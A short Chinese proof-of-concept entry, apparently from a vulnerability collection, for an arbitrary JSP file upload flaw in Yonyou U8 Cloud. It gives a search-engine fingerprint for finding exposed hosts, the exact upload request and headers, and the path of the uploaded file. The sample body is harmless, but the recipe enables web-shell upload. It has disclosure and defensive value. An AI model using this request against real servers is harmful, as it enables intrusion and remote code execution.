# 用友U8Cloudupload任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /linux/pages/upload.jsp HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Filename: 1ndex.jsp`　`Host: xx.xx.xx.xx`　`Content-Length: 6`

**请求体 / payload**
```
123456

上传文件位置
http://xx.xx.xx.xx/linux/1ndex.jsp
```

**其他**
- 用友U8 Cloud upload任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud